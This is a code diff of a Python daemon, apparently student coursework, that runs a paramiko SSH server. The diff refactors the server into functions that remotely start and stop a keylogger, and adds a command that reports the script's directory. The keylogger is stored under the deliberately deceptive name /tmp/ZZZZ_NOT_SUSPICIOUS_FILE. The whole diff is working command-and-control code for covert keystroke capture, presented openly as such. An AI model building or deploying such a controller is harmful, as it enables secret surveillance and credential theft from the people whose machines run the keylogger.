@@ -54,7 +54,7 @@ import signal
 import socket
 import time
 import json
-import a1SSHServer
+import sshServer
 import argparse
 import sys
 import atexit
@@ -253,7 +253,59 @@ def daemonize(pidfile, *, stdin='/dev/null',
     signal.signal(signal.SIGTERM, sigterm_handler)
 
 
-def serverForever(commandArgs):
+def createSSHServer(connectionServerSocket):
+    # Creating SSH Server
+    logger.info("Creating SSH Server")
+    sshSocket = paramiko.Transport(connectionServerSocket)
+
+    sshSocket.add_server_key(host_key)
+    server = sshServer.SSHServer()
+
+    try:
+        logger.info("Starting SSH Server")
+        sshSocket.start_server(server=server)
+    except paramiko.SSHException:
+        print("*** SSH negotiation failed.")
+        sys.exit(1)
+
+    logger.info("Connecting SSH Server")
+    sshChannel = sshSocket.accept(1)
+
+    if sshChannel is None:
+        print("*** No channel.")
+        sys.exit(1)
+    logger.info("****** Authenticated! ******")
+    return sshChannel
+
+
+def startRemoteKeylogger(sshChannel):
+    # command chain
+    logger.info(
+        "Sending command: python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE start")
+    sshChannel.send("python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE start")
+    RXmessage = sshChannel.recv(1024).decode()
+    logger.info(f"Received SSH message: {RXmessage}")
+
+
+def stopRemoteKeylogger(sshChannel):
+    time.sleep(28)
+    logger.info(
+        "Sending command: python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE stop")
+    sshChannel.send("python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE stop")
+    RXmessage = sshChannel.recv(1024).decode()
+    logger.info(f"Received SSH message: {RXmessage}")
+
+
+def sendCurrentPath(sshChannel, pathDirectory):
+    # command chain
+    logger.info(
+        "Sending path directory")
+    sshChannel.send(pathDirectory.encode())
+    RXmessage = sshChannel.recv(1024).decode()
+    logger.info(f"Received SSH message: {RXmessage}")
+
+
+def serverForever(commandArgs, pathDirectory):
     """Main function that will execute forever until os kills the process.
     Parent process will listen to all possible incoming clients.
     Once connection has been established parent will fork a child per connection.
@@ -299,42 +351,16 @@ def serverForever(commandArgs):
             # Closing listening socket for childeren
             listeningServerSocket.close()
 
-            # Creating SSH Server
-            logger.info("Creating SSH Server")
-            sshSocket = paramiko.Transport(connectionServerSocket)
-
-            sshSocket.add_server_key(host_key)
-            sshServer = a1SSHServer.SSHServer()
-
-            try:
-                logger.info("Starting SSH Server")
-                sshSocket.start_server(server=sshServer)
-            except paramiko.SSHException:
-                print("*** SSH negotiation failed.")
-                sys.exit(1)
-
-            logger.info("Connecting SSH Server")
-            sshChannel = sshSocket.accept(1)
-            if sshChannel is None:
-                print("*** No channel.")
-                sys.exit(1)
-            logger.info("****** Authenticated! ******")
+            sshChannel = createSSHServer(connectionServerSocket)
 
             RXmessage = sshChannel.recv(1024).decode()
+
             if RXmessage == "start":
-                # command chain
-                logger.info(
-                    "Sending command: python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE start")
-                sshChannel.send("python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE start")
-                RXmessage = sshChannel.recv(1024).decode()
-                logger.info(f"Received SSH message: {RXmessage}")
+                startRemoteKeylogger(sshChannel)
             elif RXmessage == "stop":
-                time.sleep(28)
-                logger.info(
-                    "Sending command: python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE stop")
-                sshChannel.send("python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE stop")
-                RXmessage = sshChannel.recv(1024).decode()
-                logger.info(f"Received SSH message: {RXmessage}")
+                stopRemoteKeylogger(sshChannel)
+            elif RXmessage == "path":
+                sendCurrentPath(sshChannel, currentPath)
 
             # Once task is completed close connection socket
             logger.info("Closing connections. . .")
@@ -364,11 +390,12 @@ if __name__ == '__main__':
     if commandArgs.status == "start":
         logger.info("Server process starting...")
         try:
+            currentPath = os.path.dirname(os.path.abspath(__file__))
             # Start daemonizing process
             daemonize(pidfile, stdout='/tmp/daemonServer.pid',
                       stderr='/tmp/daemonServer.pid')
             # Run server process to handle client connections
-            serverForever(commandArgs)
+            serverForever(commandArgs, currentPath)
         except RuntimeError as e:
             print(e, file=sys.stderr)
             logger.error(e)
